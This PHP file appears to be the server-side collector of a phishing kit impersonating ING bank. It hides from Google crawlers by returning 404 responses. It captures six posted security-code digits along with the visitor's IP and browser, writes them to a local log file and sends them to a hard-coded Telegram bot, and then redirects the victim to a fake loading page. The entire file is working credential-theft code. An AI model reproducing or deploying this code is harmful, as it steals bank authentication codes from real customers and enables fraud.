<?php
error_reporting(0);
 
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
function telegram_send($message) {
	$curl = curl_init();
	$api_key  = '5147160725:AAFa93029HC9UasAabwb_mDDBCC1vgJCilg';
	$chat_id  = '-1001723010874';
	$format   = 'HTML';
	curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
	$result = curl_exec($curl);
	curl_close($curl);
	return true;
}
if (is_numeric($_POST['k1']) && is_numeric($_POST['k2']) && is_numeric($_POST['k3']) && is_numeric($_POST['k4']) && is_numeric($_POST['k5']) && is_numeric($_POST['k6'])) {

// Load Composer's autoloader
require 'vendor/autoload.php';

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);


// But you can comment from here
// To here. 'cause default secure is TLS.


  
    $msg.="==================================================\r\n";
    $msg=" [+] Seguridad(ING) //logo\r\n";
    $msg.="==============================\r\n";

    $msg.="[+] Seguridad : {$_POST['k1']}|{$_POST['k2']}|{$_POST['k3']}|{$_POST['k4']}|{$_POST['k5']}|{$_POST['k6']}\r\n";
    
    $msg.="==============================\r\n";
    $msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
    $msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
    $msg.="\r\n";
    $msg.="\r\n";
    $save=fopen("./ingigi.txt","a+");fwrite($save,$msg);fclose($save);
    try {
				telegram_send(urlencode($msg));
    } catch (Exception $e) {
        header("Location: ./loading.php?link=coo");
    };
    header("Location: ./loading.php?link=coo");
    
    
}else{
    header("Location: ./code.php"); 
};

?> 